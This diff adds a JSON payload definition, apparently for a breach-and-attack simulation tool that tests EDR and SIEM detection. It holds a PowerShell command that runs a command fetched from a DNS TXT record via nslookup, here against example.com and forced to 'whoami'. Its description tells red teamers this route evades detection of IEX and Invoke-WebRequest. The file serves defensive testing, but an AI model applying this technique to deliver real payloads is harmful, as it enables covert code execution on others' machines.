@@ -1,0 +1,41 @@
+{
+  "command_content": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\n",
+  "command_executor": "psh",
+  "payload_attack_patterns": [
+    "T1059.001"
+  ],
+  "payload_description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n",
+  "payload_domains": [
+    {
+      "domain_color": "#389CFF",
+      "domain_name": "Endpoint"
+    },
+    {
+      "domain_color": "#009933",
+      "domain_name": "Network"
+    }
+  ],
+  "payload_elevation_required": false,
+  "payload_execution_arch": "ALL_ARCHITECTURES",
+  "payload_expectations": [
+    "DETECTION",
+    "PREVENTION"
+  ],
+  "payload_expected_security_platforms": {
+    "DETECTION": [
+      "EDR",
+      "SIEM",
+      "XDR"
+    ],
+    "PREVENTION": [
+      "EDR",
+      "XDR"
+    ]
+  },
+  "payload_external_id": "c900ee64-bec7-4ebf-abf8-64da7e2e70df",
+  "payload_name": "Abuse Nslookup with DNS Records",
+  "payload_platforms": [
+    "Windows"
+  ],
+  "payload_type": "Command"
+}
